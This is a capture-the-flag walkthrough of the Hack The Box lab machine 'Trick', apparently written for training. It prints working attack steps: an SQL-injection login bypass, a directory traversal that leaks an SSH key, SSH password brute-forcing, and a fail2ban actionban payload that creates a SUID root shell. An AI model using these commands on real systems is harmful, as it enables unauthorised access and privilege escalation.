# [Trick](https://app.hackthebox.com/machines/Trick)

```bash
nmap -p- --min-rate 10000 10.10.11.166 -Pn
```

![Alt text](img/image.png)


After discovering open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,25,53,80 10.10.11.166 -Pn
```

![Alt text](img/image-1.png)


Let's add this ip address into `/etc/hosts` file as `trick.htb`.


I just run `dig` to get information about domain.
```bash
dig axfr trick.htb @10.10.11.166
```

![Alt text](img/image-3.png)

I get new domain name called 'preprod-payroll.trick.htb'. I also add this into `/etc/hosts` file.


While opening this web application, I confront with authentication `login.php` page.

![Alt text](img/image-4.png)

I just try to do `SQLI` to bypass authentication via adding username **'dr4ks or 1=1;–'** and password as empty, I logged in.

![Alt text](img/image-5.png)

After this, I saved this `POST` request as `.req` file, then use `sqlmap` to attack.

```bash
sqlmap -r login.req --level 5 --risk 3 --batch
```

![Alt text](img/image-6.png)


But I cannot get enough information from here, that's why I try to make again subdomain fuzz via `preprod-{FUZZ}` by using `wfuzz` tool.


```bash
wfuzz -u http://10.10.11.166 -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
```

![Alt text](img/image-2.png)


I found `preprod-marketing.trick.htb`, let's add this into `/etc/hosts` file also.

While opening this application, I see that `index.php` file is used via `page` parameter.

![Alt text](img/image-7.png)


I guess that there can `Directory Traversal` vulnerability, let's fuzz via `zap`.

![Alt text](img/image-8.png)

After finding `Directory Traversal` vulnerability, I try to read private key (id_rsa) file.

![Alt text](img/image-9.png)


Let's copy this file `id_rsa` and save on attacker's machine.

```bash
chmod 600 id_rsa
ssh -i id_rsa michael@10.10.11.166
```

user.txt

![Alt text](img/image-10.png)


I just check privileges of this user via `sudo -l` command.

![Alt text](img/image-11.png)


Let's search privilege escalation for `fail2ban` binary on exact this [blog](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49).

```bash
ls -la iptables-multiport.conf
mv iptables-multiport.conf iptables-multiport.conf.bak
cp iptables-multiport.conf.bak iptables-multiport.conf
ls -la iptables-multiport.conf
chmod 666 iptables-multiport.conf
```

![Alt text](img/image-12.png)


After this, I add my malicious payload into `iptables-multiport.conf` file as below which is copied `bash` binary to execute via `SUID` permission.
```bash
actionban= cp /bin/bash /tmp/dr4ks; chmod 4777 /tmp/dr4ks
```

![Alt text](img/image-13.png)

After this I need to do restart operation via `sudo` privileges.
```bash
sudo /etc/init.d/fail2ban restart
```

![Alt text](img/image-14.png)

To execute this , we need to do 5 failed login attempts. For automation, I use `crackmapexec` binary.

```bash
crackmapexec ssh trick.htb -u oxdf -p /usr/share/wordlists/rockyou.txt
```

![Alt text](img/image-15.png)


Now, I can see my copied `bash` shell named as `dr4ks`, let's execute this via `-p` option.


root.txt

![Alt text](img/image-16.png)

